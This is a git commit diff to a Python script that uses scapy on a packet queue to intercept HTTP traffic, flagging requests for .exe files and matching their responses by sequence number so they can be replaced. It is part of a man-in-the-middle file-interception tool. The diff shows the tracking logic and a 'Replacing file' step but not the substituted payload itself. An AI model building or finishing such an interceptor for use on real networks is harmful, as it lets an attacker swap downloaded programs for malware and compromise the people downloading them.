71eab3afc8b417cdcac040d4d32d28bf379a8c67
xTeKc <bcd3v@pm.me>
2021-09-22 09:32:46 -0400

    refactor ack list actions

--- fileint.py
+++ fileint.py
@@ -7,14 +7,15 @@ def process_packet():
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            print("HTTP Request")
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
             print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80:
-            print("HTTP Response")
-            print(scapy_packet.show())
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+] Replacing file")
+                print(scapy_packet.show())
         
 
     packet.accept()
